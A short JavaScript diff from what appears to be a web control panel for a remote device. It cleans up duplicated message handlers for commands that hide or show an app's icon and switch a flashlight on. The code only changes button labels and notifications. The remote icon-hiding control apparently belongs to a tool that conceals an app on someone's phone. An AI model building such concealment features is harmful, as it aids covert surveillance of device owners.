@@ -1280,20 +1280,7 @@
                 pendingCommand = null;
                 break;
                 
-            // App icon visibility
-            case 'APP_HIDDEN':
-                iconHidden = true;
-                document.getElementById('iconBtn').innerText = 'Show Icon';
-                showNotification('App icon hidden');
-                pendingCommand = null;
-                break;
-                
-            case 'APP_SHOWN':
-                iconHidden = false;
-                document.getElementById('iconBtn').innerText = 'Hide Icon';
-                showNotification('App icon shown');
-                pendingCommand = null;
-                break;
+            
                 
             // Flashlight commands
             case 'FLASH_ON':
@@ -1706,13 +1693,12 @@
             document.getElementById('iconBtn').innerText = 'Show Icon';
             showNotification('App icon hidden');
             pendingCommand = null;
-            
-        } else if (msg.startsWith("APP_SHOWN")) {
+        }
+        else if (msg.startsWith("APP_SHOWN")) {
             iconHidden = false;
             document.getElementById('iconBtn').innerText = 'Hide Icon';
             showNotification('App icon shown');
             pendingCommand = null;
-            
         } else if (msg.startsWith("FLASH_ON")) {
             showNotification('🔦 Flashlight ON');
             pendingCommand = null;
